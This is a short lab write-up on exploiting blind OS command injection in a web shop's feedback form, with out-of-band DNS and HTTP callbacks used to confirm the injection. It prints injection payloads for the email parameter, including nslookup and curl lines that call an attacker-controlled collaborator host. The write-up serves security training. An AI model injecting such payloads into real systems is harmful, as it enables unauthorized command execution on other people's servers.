# Blind OS command injection with out-of-band interaction

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3cf01424-4157-4060-9e62-40874da27ca0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UFMXP74A%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204717Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDITNC6I5A5amLzbJznRuP%2BiBF9%2F16MvktXf%2FwGM%2BFj5wIhAKnN7MswgFctDx2Tw96vkwSJuKMfDtOSHPCYX1kso9TbKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwgDLxXhkV1oVprCIwq3ANJ85qF7lVcGwAUTxISJLVja7nRtSCgHie%2FrbspXXSHgSSjvojYBCA80Gy4M%2FiYrzgAPlUZaW7lnTJWzbVly%2BGWrnhzlnfjZI5BOiSAulVLZZ3avJCRxCROmimANxU2uxkv3Lb4Y2RQXt85ABVCW0PVYvBOzlOWIR%2FLlEuUKi6SbsOFp5C2Uf9x%2F5lGLoQ1fVsvzwnT5g8uASQc7Uexq3EvvMd%2BPfNfInjkkwOkJ9ru7g4Lb20pbJ7XcvAh%2Bu0aFaaRHUl5z7o1nHgtOciQL%2F7LiZwowKMYZUG3TjCwmMb%2FOsqWYG6ybGxalnhRsy%2BGmsd2OxHef7NWM1VRFDdiC3%2Fv6%2FQ50eElY%2BaRPfpdf%2FBeLk4Ym7u7ri3Ws0ntNbZcaOg32x4dMFRexGkivZ9uSLX5G7E7QFGNWfvmcc2wVInt5y%2BCBn4rV9KzLI%2FN3a3BWoUx4seZk3ewo8FGQfXym%2FMS2%2BTEJYl05Tp2%2FthhodRsk06en6g%2FFmWOQCAcpKha2nvwYFD3SsmXSbIIb2tAePndMRcKOsPP9pnu5Hm3JDMhzyXs5Os%2FuBLKApjOYG8GWCIDOFpTDX90TLVIOukBeQKU9ZWHPtSVgCQlGEFT2FhfETGS%2BJzLcG8CPFN9xzD8xaLUBjqkAaIxgUgTOX8AkL9QvQxlyXAn0pKhZFU7GtWrVBAyEygCGzY0volMeLpxBac1%2BIltn%2BF5PNhPVDaBn4h1Z0Tb0%2FQn7eF88cWAIhxtHSGaPxqVVWfo5zVugbzLBdUr9rjlWa1kajT%2B04u0m72nnL1YTqUW9AsLaQB6b4MNJyo5zWx0FrtDiKg5q1nEcnG3%2B2TyLRXwj2ViaRGPBKrDtQT4uRFOTIQz&X-Amz-Signature=823bb260c2035d40a03f16b8d983203ea3f03c60f8309a354368ef723fbc813b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

> 💡 We can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

```bash
& nslookup kgji2ohoyw.web-attacker.com &

```

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;#
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/60ea66f9-854a-4130-b9fd-6b6833371b79/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UFMXP74A%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204717Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDITNC6I5A5amLzbJznRuP%2BiBF9%2F16MvktXf%2FwGM%2BFj5wIhAKnN7MswgFctDx2Tw96vkwSJuKMfDtOSHPCYX1kso9TbKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwgDLxXhkV1oVprCIwq3ANJ85qF7lVcGwAUTxISJLVja7nRtSCgHie%2FrbspXXSHgSSjvojYBCA80Gy4M%2FiYrzgAPlUZaW7lnTJWzbVly%2BGWrnhzlnfjZI5BOiSAulVLZZ3avJCRxCROmimANxU2uxkv3Lb4Y2RQXt85ABVCW0PVYvBOzlOWIR%2FLlEuUKi6SbsOFp5C2Uf9x%2F5lGLoQ1fVsvzwnT5g8uASQc7Uexq3EvvMd%2BPfNfInjkkwOkJ9ru7g4Lb20pbJ7XcvAh%2Bu0aFaaRHUl5z7o1nHgtOciQL%2F7LiZwowKMYZUG3TjCwmMb%2FOsqWYG6ybGxalnhRsy%2BGmsd2OxHef7NWM1VRFDdiC3%2Fv6%2FQ50eElY%2BaRPfpdf%2FBeLk4Ym7u7ri3Ws0ntNbZcaOg32x4dMFRexGkivZ9uSLX5G7E7QFGNWfvmcc2wVInt5y%2BCBn4rV9KzLI%2FN3a3BWoUx4seZk3ewo8FGQfXym%2FMS2%2BTEJYl05Tp2%2FthhodRsk06en6g%2FFmWOQCAcpKha2nvwYFD3SsmXSbIIb2tAePndMRcKOsPP9pnu5Hm3JDMhzyXs5Os%2FuBLKApjOYG8GWCIDOFpTDX90TLVIOukBeQKU9ZWHPtSVgCQlGEFT2FhfETGS%2BJzLcG8CPFN9xzD8xaLUBjqkAaIxgUgTOX8AkL9QvQxlyXAn0pKhZFU7GtWrVBAyEygCGzY0volMeLpxBac1%2BIltn%2BF5PNhPVDaBn4h1Z0Tb0%2FQn7eF88cWAIhxtHSGaPxqVVWfo5zVugbzLBdUr9rjlWa1kajT%2B04u0m72nnL1YTqUW9AsLaQB6b4MNJyo5zWx0FrtDiKg5q1nEcnG3%2B2TyLRXwj2ViaRGPBKrDtQT4uRFOTIQz&X-Amz-Signature=f9740f5073db9bbc2c456184d969a9c07d9188c268de273f1eb4dce295a253e6&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

**Besides from **`nslookup`**, we can also use **`curl`**:**

`;curl bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;# `

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/b558b3bb-6a70-4cd6-8fe6-c1745e856deb/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UFMXP74A%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204717Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDITNC6I5A5amLzbJznRuP%2BiBF9%2F16MvktXf%2FwGM%2BFj5wIhAKnN7MswgFctDx2Tw96vkwSJuKMfDtOSHPCYX1kso9TbKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwgDLxXhkV1oVprCIwq3ANJ85qF7lVcGwAUTxISJLVja7nRtSCgHie%2FrbspXXSHgSSjvojYBCA80Gy4M%2FiYrzgAPlUZaW7lnTJWzbVly%2BGWrnhzlnfjZI5BOiSAulVLZZ3avJCRxCROmimANxU2uxkv3Lb4Y2RQXt85ABVCW0PVYvBOzlOWIR%2FLlEuUKi6SbsOFp5C2Uf9x%2F5lGLoQ1fVsvzwnT5g8uASQc7Uexq3EvvMd%2BPfNfInjkkwOkJ9ru7g4Lb20pbJ7XcvAh%2Bu0aFaaRHUl5z7o1nHgtOciQL%2F7LiZwowKMYZUG3TjCwmMb%2FOsqWYG6ybGxalnhRsy%2BGmsd2OxHef7NWM1VRFDdiC3%2Fv6%2FQ50eElY%2BaRPfpdf%2FBeLk4Ym7u7ri3Ws0ntNbZcaOg32x4dMFRexGkivZ9uSLX5G7E7QFGNWfvmcc2wVInt5y%2BCBn4rV9KzLI%2FN3a3BWoUx4seZk3ewo8FGQfXym%2FMS2%2BTEJYl05Tp2%2FthhodRsk06en6g%2FFmWOQCAcpKha2nvwYFD3SsmXSbIIb2tAePndMRcKOsPP9pnu5Hm3JDMhzyXs5Os%2FuBLKApjOYG8GWCIDOFpTDX90TLVIOukBeQKU9ZWHPtSVgCQlGEFT2FhfETGS%2BJzLcG8CPFN9xzD8xaLUBjqkAaIxgUgTOX8AkL9QvQxlyXAn0pKhZFU7GtWrVBAyEygCGzY0volMeLpxBac1%2BIltn%2BF5PNhPVDaBn4h1Z0Tb0%2FQn7eF88cWAIhxtHSGaPxqVVWfo5zVugbzLBdUr9rjlWa1kajT%2B04u0m72nnL1YTqUW9AsLaQB6b4MNJyo5zWx0FrtDiKg5q1nEcnG3%2B2TyLRXwj2ViaRGPBKrDtQT4uRFOTIQz&X-Amz-Signature=90fdd41c58ed24f24fd76009e803acd9c8e3fa655dec7bcc754040acbd5c67ff&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
